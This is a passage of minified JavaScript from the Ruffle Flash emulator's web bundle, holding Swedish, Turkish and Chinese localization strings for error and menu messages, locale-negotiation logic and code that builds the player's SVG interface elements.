vänligen Ruffle-wikin för hjälp.\nerror-wasm-download =\n    Ruffle har stött på ett stort fel under initialiseringen.\n    Detta kan ofta lösas av sig själv så du kan prova att ladda om sidan.\n    Kontakta annars vänligen webbplatsens administratör.\nerror-wasm-disabled-on-edge =\n    Ruffle misslyckades ladda ".wasm"-filkomponenten.\n    För att åtgärda detta försök att öppna webbläsarens inställningar, klicka på "Sekretess, sökning och tjänster", bläddra ner och stäng av "Förbättra säkerheten på webben".\n    Detta tillåter din webbläsare ladda ".wasm"-filerna.\n    Om problemet kvarstår kan du behöva använda en annan webbläsare.\nerror-javascript-conflict =\n    Ruffle har stött på ett stort fel under initialiseringen.\n    Det verkar som att den här sidan använder JavaScript-kod som stör Ruffle.\n    Om du är serveradministratören bjuder vi in dig att försöka köra filen på en blank sida.\nerror-javascript-conflict-outdated = Du kan också försöka ladda upp en nyare version av Ruffle, vilket kan kringgå problemet (nuvarande version är utdaterad: { $buildDate }).\nerror-csp-conflict =\n    Ruffle har stött på ett stort fel under initialiseringen.\n    Denna webbservers Content Security Policy tillåter inte ".wasm"-komponenten att köra.\n    Om du är serveradministratören konsultera vänligen Ruffle-wikin för hjälp.\nerror-unknown =\n    Ruffle har stött på ett stort fel medan den försökte visa Flashinnehållet.\n    { $outdated ->\n        [true] Om du är serveradministratören försök att ladda upp en nyare version av Ruffle (nuvarande version är utdaterad: { $buildDate }).\n       *[false] Detta är inte tänkt att hända så vi skulle verkligen uppskatta om du kunde rapportera in en bugg!\n    }\n', "save-manager.ftl": "save-delete-prompt = Är du säker på att du vill radera sparfilen?\nsave-reload-prompt =\n    Det enda sättet att { $action ->\n        [delete] radera\n       *[replace] ersätta\n    } denna sparfil utan potentiell konflikt är att ladda om innehållet. Vill du fortsätta ändå?\nsave-download = Ladda ner\nsave-replace = Ersätt\nsave-delete = Radera\nsave-backup-all = Ladda ner alla sparfiler\n", "volume-controls.ftl": "volume-controls = Ljudkontroller\nvolume-controls-mute = Stäng av ljud\nvolume-controls-volume = Volym\n"}, "tr-TR": {"context_menu.ftl": "context-menu-download-swf = İndir .swf\ncontext-menu-copy-debug-info = Hata ayıklama bilgisini kopyala\ncontext-menu-open-save-manager = Kayıt Yöneticisini Aç\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Ruffle Uzantısı Hakkında ({ $version })\n       *[other] Ruffle Hakkında ({ $version })\n    }\ncontext-menu-hide = Bu menüyü gizle\ncontext-menu-exit-fullscreen = Tam ekrandan çık\ncontext-menu-enter-fullscreen = Tam ekran yap\ncontext-menu-volume-controls = Ses kontrolleri\n", "messages.ftl": 'message-cant-embed =\n    Ruffle, bu sayfaya gömülü Flash\'ı çalıştıramadı.\n    Bu sorunu ortadan kaldırmak için dosyayı ayrı bir sekmede açmayı deneyebilirsiniz.\npanic-title = Bir şeyler yanlış gitti :(\nmore-info = Daha fazla bilgi\nrun-anyway = Yine de çalıştır\ncontinue = Devam et\nreport-bug = Hata Bildir\nupdate-ruffle = Ruffle\'ı Güncelle\nruffle-demo = Ağ Demosu\nruffle-desktop = Masaüstü Uygulaması\nruffle-wiki = Ruffle Wiki\'yi Görüntüle\nenable-hardware-acceleration = Görünüşe göre donanım hızlandırma etkin değil. Ruffle çalışabilir ancak fazlasıyla yavaş olabilir. Donanım hızlandırmayı nasıl etkinleştirebiliceğiniz hakkında bu linkten bilgi alabilirsiniz.\nview-error-details = Hata Ayrıntılarını Görüntüle\nopen-in-new-tab = Yeni sekmede aç\nclick-to-unmute = Sesi açmak için tıklayın\nerror-file-protocol =\n    Görünüşe göre Ruffle\'ı "dosya:" protokolünde çalıştırıyorsunuz.\n    Tarayıcılar güvenlik nedenleriyle birçok özelliğin çalışmasını engellediğinden bu işe yaramaz.\n    Bunun yerine, sizi yerel bir sunucu kurmaya veya ağın demosunu ya da masaüstü uygulamasını kullanmaya davet ediyoruz.\nerror-javascript-config =\n    Ruffle, yanlış bir JavaScript yapılandırması nedeniyle önemli bir sorunla karşılaştı.\n    Sunucu yöneticisiyseniz, hangi parametrenin hatalı olduğunu bulmak için sizi hata ayrıntılarını kontrol etmeye davet ediyoruz.\n    Yardım için Ruffle wiki\'sine de başvurabilirsiniz.\nerror-wasm-not-found =\n    Ruffle gerekli ".wasm" dosya bileşenini yükleyemedi.\n    Sunucu yöneticisi iseniz, lütfen dosyanın doğru bir şekilde yüklendiğinden emin olun.\n    Sorun devam ederse, "publicPath" ayarını kullanmanız gerekebilir: yardım için lütfen Ruffle wiki\'sine başvurun.\nerror-wasm-mime-type =\n    Ruffle, başlatmaya çalışırken önemli bir sorunla karşılaştı.\n    Bu web sunucusu, doğru MIME tipinde ".wasm" dosyaları sunmuyor.\n    Sunucu yöneticisiyseniz, yardım için lütfen Ruffle wiki\'sine başvurun.\nerror-swf-fetch =\n    Ruffle, Flash SWF dosyasını yükleyemedi.\n    Bunun en olası nedeni, dosyanın artık mevcut olmaması ve bu nedenle Ruffle\'ın yükleyeceği hiçbir şeyin olmamasıdır.\n    Yardım için web sitesi yöneticisiyle iletişime geçmeyi deneyin.\nerror-swf-cors =\n    Ruffle, Flash SWF dosyasını yükleyemedi.\n    Getirme erişimi muhtemelen CORS politikası tarafından engellenmiştir.\n    Sunucu yöneticisiyseniz, yardım için lütfen Ruffle wiki\'sine başvurun.\nerror-wasm-cors =\n    Ruffle gerekli ".wasm" dosya bileşenini yükleyemedi.\n    Getirme erişimi muhtemelen CORS politikası tarafından engellenmiştir.\n    Sunucu yöneticisiyseniz, yardım için lütfen Ruffle wiki\'sine başvurun.\nerror-wasm-invalid =\n    Ruffle, başlatmaya çalışırken önemli bir sorunla karşılaştı.\n    Görünüşe göre bu sayfada Ruffle\'ı çalıştırmak için eksik veya geçersiz dosyalar var.\n    Sunucu yöneticisiyseniz, yardım için lütfen Ruffle wiki\'sine başvurun.\nerror-wasm-download =\n    Ruffle, başlatmaya çalışırken önemli bir sorunla karşılaştı.\n    Bu genellikle kendi kendine çözülebilir, bu nedenle sayfayı yeniden yüklemeyi deneyebilirsiniz.\n    Aksi takdirde, lütfen site yöneticisiyle iletişime geçin.\nerror-wasm-disabled-on-edge =\n    Ruffle gerekli ".wasm" dosya bileşenini yükleyemedi.\n    Bunu düzeltmek için tarayıcınızın ayarlarını açın, "Gizlilik, arama ve hizmetler"i tıklayın, aşağı kaydırın ve "Web\'de güvenliğinizi artırın"ı kapatmayı deneyin.\n    Bu, tarayıcınızın gerekli ".wasm" dosyalarını yüklemesine izin verecektir.\n    Sorun devam ederse, farklı bir tarayıcı kullanmanız gerekebilir.\nerror-javascript-conflict =\n    Ruffle, başlatmaya çalışırken önemli bir sorunla karşılaştı.\n    Görünüşe göre bu sayfa, Ruffle ile çakışan JavaScript kodu kullanıyor.\n    Sunucu yöneticisiyseniz, sizi dosyayı boş bir sayfaya yüklemeyi denemeye davet ediyoruz.\nerror-javascript-conflict-outdated = Ayrıca sorunu giderebilecek daha yeni bir Ruffle sürümü yüklemeyi de deneyebilirsiniz (mevcut yapım eskimiş: { $buildDate }).\nerror-csp-conflict =\n    Ruffle, başlatmaya çalışırken önemli bir sorunla karşılaştı.\n    Bu web sunucusunun İçerik Güvenliği Politikası, gerekli ".wasm" bileşeninin çalışmasına izin vermiyor.\n    Sunucu yöneticisiyseniz, yardım için lütfen Ruffle wiki\'sine bakın.\nerror-unknown =\n    Ruffle, bu Flash içeriğini görüntülemeye çalışırken önemli bir sorunla karşılaştı.\n    { $outdated ->\n        [true] Sunucu yöneticisiyseniz, lütfen Ruffle\'ın daha yeni bir sürümünü yüklemeyi deneyin (mevcut yapım eskimiş: { $buildDate }).\n       *[false] Bunun olmaması gerekiyor, bu yüzden bir hata bildirebilirseniz çok memnun oluruz!\n    }\n', "save-manager.ftl": "save-delete-prompt = Bu kayıt dosyasını silmek istediğinize emin misiniz?\nsave-reload-prompt =\n    Bu kaydetme dosyasını potansiyel çakışma olmadan { $action ->\n        [delete] silmenin\n       *[replace] değiştirmenin\n    } tek yolu, bu içeriği yeniden yüklemektir. Yine de devam etmek istiyor musunuz?\nsave-download = İndir\nsave-replace = Değiştir\nsave-delete = Sil\nsave-backup-all = Tüm kayıt dosyalarını indir\n", "volume-controls.ftl": "volume-controls = Ses kontrolleri\nvolume-controls-mute = Sustur\nvolume-controls-volume = Ses\n"}, "zh-CN": {"context_menu.ftl": "context-menu-download-swf = 下载 .swf\ncontext-menu-copy-debug-info = 复制调试信息\ncontext-menu-open-save-manager = 打开存档管理器\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] 关于 Ruffle 扩展 ({ $version })\n       *[other] 关于 Ruffle ({ $version })\n    }\ncontext-menu-hide = 隐藏此菜单\ncontext-menu-exit-fullscreen = 退出全屏\ncontext-menu-enter-fullscreen = 进入全屏\ncontext-menu-volume-controls = 音量控制\n", "messages.ftl": 'message-cant-embed =\n    Ruffle 无法运行嵌入在此页面中的 Flash。\n    您可以尝试在单独的标签页中打开该文件，以回避此问题。\npanic-title = 出了些问题 :(\nmore-info = 更多信息\nrun-anyway = 仍然运行\ncontinue = 继续\nreport-bug = 反馈问题\nupdate-ruffle = 更新 Ruffle\nruffle-demo = 网页演示\nruffle-desktop = 桌面应用程序\nruffle-wiki = 查看 Ruffle Wiki\nenable-hardware-acceleration = 看起来硬件加速未启用。虽然 Ruffle 可能运行，但可能会非常慢。您可以通过此链接了解启用硬件加速的方法。\nview-error-details = 查看错误详情\nopen-in-new-tab = 在新标签页中打开\nclick-to-unmute = 点击取消静音\nerror-file-protocol =\n    看来您正在 "file:" 协议上使用 Ruffle。\n    由于浏览器以安全原因阻止许多功能，因此这不起作用。\n    相反我们邀请您设置本地服务器或使用网页演示或桌面应用程序。\nerror-javascript-config =\n    由于错误的 JavaScript 配置，Ruffle 遇到了一个重大问题。\n    如果您是服务器管理员，我们邀请您检查错误详细信息，以找出哪个参数有故障。\n    您也可以查阅 Ruffle 的 Wiki 获取帮助。\nerror-wasm-not-found =\n    Ruffle 无法加载所需的 “.wasm” 文件组件。\n    如果您是服务器管理员，请确保文件已正确上传。\n    如果问题仍然存在，您可能需要使用 “publicPath” 设置：请查看 Ruffle 的 Wiki 获取帮助。\nerror-wasm-mime-type =\n    Ruffle 在试图初始化时遇到了一个重大问题。\n    该网站服务器没有提供 ".asm” 文件正确的 MIME 类型。\n    如果您是服务器管理员，请查阅 Ruffle Wiki 获取帮助。\nerror-swf-fetch =\n    Ruffle 无法加载 Flash SWF 文件。\n    最可能的原因是文件不再存在所以 Ruffle 没有要加载的内容。\n    请尝试联系网站管理员寻求帮助。\nerror-swf-cors =\n    Ruffle 无法加载 Flash SWF 文件。\n    获取权限可能被 CORS 策略阻止。\n    如果您是服务器管理员，请参考 Ruffle Wiki 获取帮助。\nerror-wasm-cors =\n    Ruffle 无法加载所需的“.wasm”文件组件。\n    获取权限可能被 CORS 策略阻止。\n    如果您是服务器管理员，请查阅 Ruffle Wiki 获取帮助。\nerror-wasm-invalid =\n    Ruffle 在试图初始化时遇到了一个重大问题。\n    这个页面似乎缺少文件来运行 Curl。\n    如果您是服务器管理员，请查阅 Ruffle Wiki 获取帮助。\nerror-wasm-download =\n    Ruffle 在试图初始化时遇到了一个重大问题。\n    这通常可以自行解决，因此您可以尝试重新加载页面。\n    否则请联系网站管理员。\nerror-wasm-disabled-on-edge =\n    Ruffle 无法加载所需的 “.wasm” 文件组件。\n    要解决这个问题，请尝试打开您的浏览器设置，单击"隐私、搜索和服务"，向下滚动并关闭"增强 Web 安全性"。\n    这将允许您的浏览器加载所需的 “.wasm” 文件。\n    如果问题仍然存在，您可能必须使用不同的浏览器。\nerror-javascript-conflict =\n    Ruffle 在试图初始化时遇到了一个重大问题。\n    这个页面似乎使用了与 Ruffle 冲突的 JavaScript 代码。\n    如果您是服务器管理员，我们建议您尝试在空白页面上加载文件。\nerror-javascript-conflict-outdated = 您还可以尝试上传可能规避该问题的最新版本的 (当前构建已过时: { $buildDate })。\nerror-csp-conflict =\n    Ruffle 在试图初始化时遇到了一个重大问题。\n    该网站服务器的内容安全策略不允许运行所需的 “.wasm” 组件。\n    如果您是服务器管理员，请查阅 Ruffle Wiki 获取帮助。\nerror-unknown =\n    Ruffle 在试图显示此 Flash 内容时遇到了一个重大问题。\n    { $outdated ->\n        [true] 如果您是服务器管理员，请尝试上传更新的 Ruffle 版本 (当前版本已过时: { $buildDate }).\n       *[false] 这不应该发生，因此如果您可以报告错误，我们将非常感谢！\n    }\n', "save-manager.ftl": "save-delete-prompt = 确定要删除此存档吗？\nsave-reload-prompt =\n    为了避免潜在的冲突，{ $action ->\n        [delete] 删除\n       *[replace] 替换\n    } 此存档文件需要重新加载当前内容。是否仍然继续？\nsave-download = 下载\nsave-replace = 替换\nsave-delete = 删除\nsave-backup-all = 下载所有存档文件\n", "volume-controls.ftl": "volume-controls = 音量控制\nvolume-controls-mute = 静音\nvolume-controls-volume = 音量\n"}, "zh-TW": {"context_menu.ftl": "context-menu-download-swf = 下載SWF檔案\ncontext-menu-copy-debug-info = 複製除錯資訊\ncontext-menu-open-save-manager = 打開存檔管理器\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] 關於Ruffle擴充功能 ({ $version })\n       *[other] 關於Ruffle ({ $version })\n    }\ncontext-menu-hide = 隱藏菜單\ncontext-menu-exit-fullscreen = 退出全螢幕\ncontext-menu-enter-fullscreen = 進入全螢幕\ncontext-menu-volume-controls = 音量控制\n", "messages.ftl": 'message-cant-embed =\n    目前Ruffle沒辦法執行嵌入式Flash。\n    你可以在新分頁中開啟來解決這個問題。\npanic-title = 完蛋，出問題了 :(\nmore-info = 更多資訊\nrun-anyway = 直接執行\ncontinue = 繼續\nreport-bug = 回報BUG\nupdate-ruffle = 更新Ruffle\nruffle-demo = 網頁展示\nruffle-desktop = 桌面應用程式\nruffle-wiki = 查看Ruffle Wiki\nenable-hardware-acceleration =\n    看起來你的硬體加速沒有開啟，雖然Ruffle還可以執行，但是你會感覺到會很慢。\n    你可以在下方連結找到如何開啟硬體加速。\nview-error-details = 檢視錯誤詳細資料\nopen-in-new-tab = 開啟新增分頁\nclick-to-unmute = 點擊以取消靜音\nerror-file-protocol =\n    看起來你想要用Ruffle來執行"file:"的協議。\n    因為瀏覽器禁了很多功能以資安的理由來講。\n    我們建議你建立本地伺服器或著直接使用網頁展示或桌面應用程式。\nerror-javascript-config =\n    目前Ruffle遇到不正確的JavaScript配置。\n    如果你是伺服器管理員，我們建議你檢查哪個環節出錯。\n    或著你可以查詢Ruffle wiki得到需求幫助。\nerror-wasm-not-found =\n    目前Ruffle找不到".wasm"檔案。\n    如果你是伺服器管理員，確保檔案是否放對位置。\n    如果還是有問題的話，你要用"publicPath"來設定: 或著查詢Ruffle wiki得到需求幫助。\nerror-wasm-mime-type =\n    目前Ruffle初始化時遇到重大問題。\n    這網頁伺服器並沒有服務".wasm"檔案或正確的網際網路媒體類型。\n    如果你是伺服器管理員，請查詢Ruffle wiki得到需求幫助。\nerror-swf-fetch =\n    目前Ruffle無法讀取Flash的SWF檔案。\n    很有可能要讀取的檔案不存在，所以Ruffle讀不到東西。\n    請嘗試溝通伺服器管理員得到需求幫助。\nerror-swf-cors =\n    目前Ruffle無法讀取Flash的SWF檔案。\n    看起來是使用權被跨來源資源共用機制被擋到了。\n    如果你是伺服器管理員，請查詢Ruffle wiki得到需求幫助。\nerror-wasm-cors =\n    目前Ruffle無法讀取".wasm"檔案。\n    看起來是使用權被跨來源資源共用機制被擋到了。\n    如果你是伺服器管理員，請查詢Ruffle wiki得到需求幫助。\nerror-wasm-invalid =\n    目前Ruffle初始化時遇到重大問題。\n    看起來這網頁有缺失檔案導致Ruffle無法運行。\n    如果你是伺服器管理員，請查詢Ruffle wiki得到需求幫助。\nerror-wasm-download =\n    目前Ruffle初始化時遇到重大問題。\n    這可以你自己解決，你只要重新整理就好了。\n    否則，請嘗試溝通伺服器管理員得到需求幫助。\nerror-wasm-disabled-on-edge =\n    目前Ruffle無法讀取".wasm"檔案。\n    要修正的話，打開你的瀏覽器設定，點選"隱私權、搜尋與服務"，把"防止追蹤"給關掉。\n    這樣一來你的瀏覽器會讀取需要的".wasm"檔案。\n    如果問題一直還在的話，你必須要換瀏覽器了。\nerror-javascript-conflict =\n    目前Ruffle初始化時遇到重大問題。\n    看起來這網頁使用的JavaScript會跟Ruffle起衝突。\n    如果你是伺服器管理員，我們建議你開個空白頁來測試。\nerror-javascript-conflict-outdated = 你也可以上傳最新版的Ruffle，說不定你要說的的問題已經不見了(現在使用的版本已經過時: { $buildDate })。\nerror-csp-conflict =\n    目前Ruffle初始化時遇到重大問題。\n    這網頁伺服器被跨來源資源共用機制禁止讀取".wasm"檔案。\n    如果你是伺服器管理員，請查詢Ruffle wiki得到需求幫助。\nerror-unknown =\n    目前Ruffle初始化要讀取Flash內容時遇到重大問題\n    { $outdated ->\n        [true] 如果你是伺服器管理員， 請上傳最新版的Ruffle(現在使用的版本已經過時: { $buildDate }).\n       *[false] 這不應該發生的，我們也很高興你告知bug!\n    }\n', "save-manager.ftl": "save-delete-prompt = 你確定要刪除這個存檔嗎？\nsave-reload-prompt =\n    唯一方法只有 { $action ->\n        [delete] 刪除\n       *[replace] 取代\n    } 這個存檔不會完全取代直到重新啟動. 你需要繼續嗎?\nsave-download = 下載\nsave-replace = 取代\nsave-delete = 刪除\nsave-backup-all = 下載所有存檔檔案。\n", "volume-controls.ftl": "volume-controls = 音量控制\nvolume-controls-mute = 靜音\nvolume-controls-volume = 音量\n"}}, he = {};
    for (const [e, n] of Object.entries(me)) {
      const t = new P(e);
      if (n) for (const [r, a] of Object.entries(n)) if (a) for (const n of t.addResource(new oe(a))) console.error(`Error in text for ${e} ${r}: ${n}`);
      he[e] = t;
    }
    function pe(e, n, t) {
      const r = he[e];
      if (undefined !== r) {
        const e = r.getMessage(n);
        if (undefined !== e && e.value) return r.formatPattern(e.value, t);
      }
      return null;
    }
    function ve(e, n) {
      const t = function fe(e, n, {strategy: t = "filtering", defaultLocale: r} = {}) {
        const a = function (e, n, t) {
          const r = new Set, a = new Map;
          for (let e of n) new ue(e).isWellFormed && a.set(e, new ue(e));
          e: for (const n of e) {
            const e = n.toLowerCase(), i = new ue(e);
            if (undefined !== i.language) {
              for (const n of a.keys()) if (e === n.toLowerCase()) {
                if (r.add(n), a.delete(n), "lookup" === t) return Array.from(r);
                if ("filtering" === t) continue;
                continue e;
              }
              for (const [e, n] of a.entries()) if (n.matches(i, true, false)) {
                if (r.add(e), a.delete(e), "lookup" === t) return Array.from(r);
                if ("filtering" === t) continue;
                continue e;
              }
              if (i.addLikelySubtags()) for (const [e, n] of a.entries()) if (n.matches(i, true, false)) {
                if (r.add(e), a.delete(e), "lookup" === t) return Array.from(r);
                if ("filtering" === t) continue;
                continue e;
              }
              i.clearVariants();
              for (const [e, n] of a.entries()) if (n.matches(i, true, true)) {
                if (r.add(e), a.delete(e), "lookup" === t) return Array.from(r);
                if ("filtering" === t) continue;
                continue e;
              }
              if (i.clearRegion(), i.addLikelySubtags()) for (const [e, n] of a.entries()) if (n.matches(i, true, false)) {
                if (r.add(e), a.delete(e), "lookup" === t) return Array.from(r);
                if ("filtering" === t) continue;
                continue e;
              }
              i.clearRegion();
              for (const [e, n] of a.entries()) if (n.matches(i, true, true)) {
                if (r.add(e), a.delete(e), "lookup" === t) return Array.from(r);
                if ("filtering" === t) continue;
                continue e;
              }
            }
          }
          return Array.from(r);
        }(Array.from(null != e ? e : []).map(String), Array.from(null != n ? n : []).map(String), t);
        if ("lookup" === t) {
          if (undefined === r) throw new Error("defaultLocale cannot be undefined for strategy `lookup`");
          0 === a.length && a.push(r);
        } else r && !a.includes(r) && a.push(r);
        return a;
      }(navigator.languages, Object.keys(he), {defaultLocale: "en-US"});
      for (const r in t) {
        const a = pe(t[r], e, n);
        if (a) return a;
      }
      return console.error(`Unknown text key '${e}'`), e;
    }
    function ge(e, n) {
      const t = document.createElement("div");
      return ve(e, n).split("\n").forEach(e => {
        const n = document.createElement("p");
        n.innerText = e, t.appendChild(n);
      }), t;
    }
    function be(e, n, t, r, a) {
      const i = a ? document.createElementNS(a, e) : document.createElement(e);
      if (n && (i.id = n), t && a ? i.classList.add(t) : t && (i.className = t), r) for (const [e, n] of Object.entries(r)) i.setAttribute(e, n);
      return i;
    }
    function we(e, n, t, r, a) {
      const i = be("input", n);
      return i.type = e, t && (i.min = t), r && (i.max = r), a && (i.step = a), i;
    }
    function ke(e, n) {
      const t = be("label", e);
      return t.htmlFor = n, t;
    }
    function ye(e, n) {
      e.appendChild(n);
    }
    const xe = document.createElement("template"), Re = "http://www.w3.org/2000/svg", _e = be("style", "static-styles"), ze = be("style", "dynamic-styles"), Se = be("div", "container"), je = be("div", "play-button"), Ee = be("div", undefined, "icon"), Ce = be("svg", undefined, undefined, {xmlns: Re, "xmlns:xlink": "http://www.w3.org/1999/xlink", preserveAspectRatio: "xMidYMid", viewBox: "0 0 250 250", width: "100%", height: "100%"}, Re), Ae = be("defs", undefined, undefined, undefined, Re), Ie = be("linearGradient", "a", undefined, {gradientUnits: "userSpaceOnUse", x1: "125", y1: "0", x2: "125", y2: "250", spreadMethod: "pad"}, Re), Fe = be("stop", undefined, undefined, {offset: "0%", "stop-color": "#FDA138"}, Re), Oe = be("stop", undefined, undefined, {offset: "100%", "stop-color": "#FD3A40"}, Re), De = be("g", "b", undefined, undefined, Re), Pe = be("path", undefined, undefined, {fill: "url(#a)", d: "M250 125q0-52-37-88-36-37-88-37T37 37Q0 73 0 125t37 88q36 37 88 37t88-37q37-36 37-88M87 195V55l100 70-100 70z"}, Re), Te = be("path", undefined, undefined, {fill: "#FFF", d: "M87 55v140l100-70L87 55z"}, Re), qe = document.createElementNS(Re, "use");
    qe.href.baseVal = "#b";
    const Me = be("div", "unmute-overlay"), Be = be("div", undefined, "background"), We = be("div", undefined, "icon"), Le = be("svg", "unmute-overlay-svg", undefined, {xmlns: Re, "xmlns:xlink": "http://www.w3.org/1999/xlink", preserveAspectRatio: "xMidYMid", viewBox: "0 0 512 584", width: "100%", height: "100%", scale: "0.8"}, Re), $e = be("path", undefined, undefined, {fill: "#FFF", stroke: "#FFF", d: "m457.941 256 47.029-47.029c9.372-9.373 9.372-24.568 0-33.941-9.373-9.373-24.568-9.373-33.941 0l-47.029 47.029-47.029-47.029c-9.373-9.373-24.568-9.373-33.941 0-9.372 9.373-9.372 24.568 0 33.941l47.029 47.029-47.029 47.029c-9.372 9.373-9.372 24.568 0 33.941 4.686 4.687 10.827 7.03 16.97 7.03s12.284-2.343 16.971-7.029l47.029-47.03 47.029 47.029c4.687 4.687 10.828 7.03 16.971 7.03s12.284-2.343 16.971-7.029c9.372-9.373 9.372-24.568 0-33.941z"}, Re), Ne = be("path", undefined, undefined, {fill: "#FFF", stroke: "#FFF", d: "m99 160h-55c-24.301 0-44 19.699-44 44v104c0 24.301 19.699 44 44 44h55c2.761 0 5-2.239 5-5v-182c0-2.761-2.239-5-5-5z"}, Re), Ue = be("path", undefined, undefined, {fill: "#FFF", stroke: "#FFF", d: "m280 56h-24c-5.269 0-10.392 1.734-14.578 4.935l-103.459 79.116c-1.237.946-1.963 2.414-1.963 3.972v223.955c0 1.557.726 3.026 1.963 3.972l103.459 79.115c4.186 3.201 9.309 4.936 14.579 4.936h23.999c13.255 0 24-10.745 24-24v-352.001c0-13.255-10.745-24-24-24z"}, Re), Ze = be("text", "unmute-text", undefined, {x: "256", y: "560", "text-anchor": "middle", "font-size": "60px", fill: "#FFF", stroke: "#FFF"}, Re), He = be("input", "virtual-keyboard", undefined, {type: "text", autocapitalize: "off", autocomplete: "off", autocorrect: "off"}), Je = be("div", "splash-screen", "hidden"), Ve = be("svg", undefined, "logo", {xmlns: Re, "xmlns:xlink": "http://www.w3.org/1999/xlink", preserveAspectRatio: "xMidYMid", viewBox: "0 0 380 150"}, Re), Ke = be("g", undefined, undefined, undefined, Re), Ge = be("path", undefined, undefined, {fill: "#966214", d: "M58.75 85.6q.75-.1 1.5-.35.85-.25 1.65-.75.55-.35 1.05-.8.5-.45.95-1 .5-.5.75-1.2-.05.05-.15.1-.1.15-.25.25l-.1.2q-.15.05-.25.1-.4 0-.8.05-.5-.25-.9-.5-.3-.1-.55-.3l-.6-.6-4.25-6.45-1.5 11.25h3.45m83.15-.2h3.45q.75-.1 1.5-.35.25-.05.45-.15.35-.15.65-.3l.5-.3q.25-.15.5-.35.45-.35.9-.75.45-.35.75-.85l.1-.1q.1-.2.2-.35.2-.3.35-.6l-.3.4-.15.15q-.5.15-1.1.1-.25 0-.4-.05-.5-.15-.8-.4-.15-.1-.25-.25-.3-.3-.55-.6l-.05-.05v-.05l-4.25-6.4-1.5 11.25m-21.15-3.95q-.3-.3-.55-.6l-.05-.05v-.05l-4.25-6.4-1.5 11.25h3.45q.75-.1 1.5-.35.85-.25 1.6-.75.75-.5 1.4-1.1.45-.35.75-.85.35-.5.65-1.05l-.45.55q-.5.15-1.1.1-.9 0-1.45-.7m59.15.3q-.75-.5-1.4-1-3.15-2.55-3.5-6.4l-1.5 11.25h21q-3.1-.25-5.7-.75-5.6-1.05-8.9-3.1m94.2 3.85h3.45q.6-.1 1.2-.3.4-.1.75-.2.35-.15.65-.3.7-.35 1.35-.8.75-.55 1.3-1.25.1-.15.25-.3-2.55-.25-3.25-1.8l-4.2-6.3-1.5 11.25m-45.3-4.85q-.5-.4-.9-.8-2.3-2.35-2.6-5.6l-1.5 11.25h21q-11.25-.95-16-4.85m97.7 4.85q-.3-.05-.6-.05-10.8-1-15.4-4.8-3.15-2.55-3.5-6.35l-1.5 11.2h21Z"}, Re), Ye = be("path", undefined, undefined, {fill: "var(--ruffle-orange)", d: "M92.6 54.8q-1.95-1.4-4.5-1.4H60.35q-1.35 0-2.6.45-1.65.55-3.15 1.8-2.75 2.25-3.25 5.25l-1.65 12h.05v.3l5.85 1.15h-9.5q-.5.05-1 .15-.5.15-1 .35-.5.2-.95.45-.5.3-.95.7-.45.35-.85.8-.35.4-.65.85-.3.45-.5.9-.15.45-.3.95l-5.85 41.6H50.3l5-35.5 1.5-11.25 4.25 6.45.6.6q.25.2.55.3.4.25.9.5.4-.05.8-.05.1-.05.25-.1l.1-.2q.15-.1.25-.25.1-.05.15-.1l.3-1.05 1.75-12.3h11.15L75.8 82.6h16.5l2.3-16.25h-.05l.8-5.7q.4-2.45-1-4.2-.35-.4-.75-.8-.25-.25-.55-.5-.2-.2-.45-.35m16.2 18.1h.05l-.05.3 5.85 1.15H105.2q-.5.05-1 .15-.5.15-1 .35-.5.2-.95.45-.5.3-1 .65-.4.4-.8.85-.25.3-.55.65-.05.1-.15.2-.25.45-.4.9-.2.45-.3.95-.1.65-.2 1.25-.2 1.15-.4 2.25l-4.3 30.6q-.25 3 1.75 5.25 1.6 1.8 4 2.15.6.1 1.25.1h27.35q3.25 0 6-2.25.35-.35.7-.55l.3-.2q2-2 2.25-4.5l1.65-11.6q.05-.05.1-.05l1.65-11.35h.05l.7-5.2 1.5-11.25 4.25 6.4v.05l.05.05q.25.3.55.6.1.15.25.25.3.25.8.4.15.05.4.05.6.05 1.1-.1l.15-.15.3-.4.3-1.05 1.3-9.05h-.05l.7-5.05h-.05l.15-1.25h-.05l1.65-11.7h-16.25l-2.65 19.5h.05v.2l-.05.1h.05l5.8 1.15H132.7q-.5.05-1 .15-.5.15-1 .35-.15.05-.3.15-.3.1-.55.25-.05 0-.1.05-.5.3-1 .65-.4.35-.7.7-.55.7-.95 1.45-.35.65-.55 1.4-.15.7-.25 1.4v.05q-.15 1.05-.35 2.05l-1.2 8.75v.1l-2.1 14.7H111.4l2.25-15.55h.05l.7-5.2 1.5-11.25 4.25 6.4v.05l.05.05q.25.3.55.6.55.7 1.45.7.6.05 1.1-.1l.45-.55.3-1.05 1.3-9.05h-.05l.7-5.05h-.05l.15-1.25h-.05l1.65-11.7h-16.25l-2.65 19.5m106.5-41.75q-2.25-2.25-5.5-2.25h-27.75q-3 0-5.75 2.25-1.3.95-2.05 2.1-.45.6-.7 1.2-.2.5-.35 1-.1.45-.15.95l-4.15 29.95h-.05l-.7 5.2h-.05l-.2 1.35h.05l-.05.3 5.85 1.15h-9.45q-2.1.05-3.95 1.6-1.9 1.55-2.25 3.55l-.5 3.5h-.05l-5.3 38.1h16.25l5-35.5 1.5-11.25q.35 3.85 3.5 6.4.65.5 1.4 1 3.3 2.05 8.9 3.1 2.6.5 5.7.75l1.75-11.25h-12.2l.4-2.95h-.05l.7-5.05h-.05q.1-.9.3-1.9.1-.75.2-1.6.85-5.9 2.15-14.9 0-.15.05-.25l.1-.9q.2-1.55.45-3.15h11.25l-3.1 20.8h16.5l4.1-28.05q.15-1.7-.4-3.15-.5-1.1-1.35-2.1m46.65 44.15q-.5.3-1 .65-.4.4-.8.85-.35.4-.7.85-.25.45-.45.9-.15.45-.3.95l-5.85 41.6h16.25l5-35.5 1.5-11.25 4.2 6.3q.7 1.55 3.25 1.8l.05-.1q.25-.4.35-.85l.3-1.05 1.8-14.05v-.05l5.35-37.45h-16.25l-6.15 44.3 5.85 1.15h-9.45q-.5.05-1 .15-.5.15-1 .35-.5.2-.95.45m5.4-38.9q.15-1.7-.4-3.15-.5-1.1-1.35-2.1-2.25-2.25-5.5-2.25h-27.75q-2.3 0-4.45 1.35-.65.35-1.3.9-1.3.95-2.05 2.1-.45.6-.7 1.2-.4.9-.5 1.95l-4.15 29.95h-.05l-.7 5.2h-.05l-.2 1.35h.05l-.05.3 5.85 1.15h-9.45q-2.1.05-3.95 1.6-1.9 1.55-2.25 3.55l-.5 3.5h-.05l-1.2 8.75v.1l-4.1 29.25h16.25l5-35.5 1.5-11.25q.3 3.25 2.6 5.6.4.4.9.8 4.75 